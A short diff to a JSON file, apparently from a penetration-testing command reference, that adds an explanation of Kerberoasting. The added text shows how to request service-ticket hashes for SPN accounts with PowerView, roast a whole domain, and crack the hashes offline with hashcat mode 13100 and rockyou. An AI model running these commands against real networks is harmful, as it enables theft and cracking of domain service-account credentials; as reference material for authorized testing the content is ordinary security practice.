@@ -112,5 +112,6 @@
       "label": "Crack offline",
       "command": "hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt"
     }
-  ]
+  ],
+  "explain": "Roasts SPN accounts directly with PowerView, output in hashcat format:\n  Get-DomainUser -Identity <user>   pick the SPN account (or use -SPN for all)\n  | Get-DomainSPNTicket   request its TGS ticket\n  -Format Hashcat          emit it in hashcat-crackable format\nPipe all -SPN users through it to roast the whole domain to a CSV; crack the hashes with hashcat -m 13100."
 }
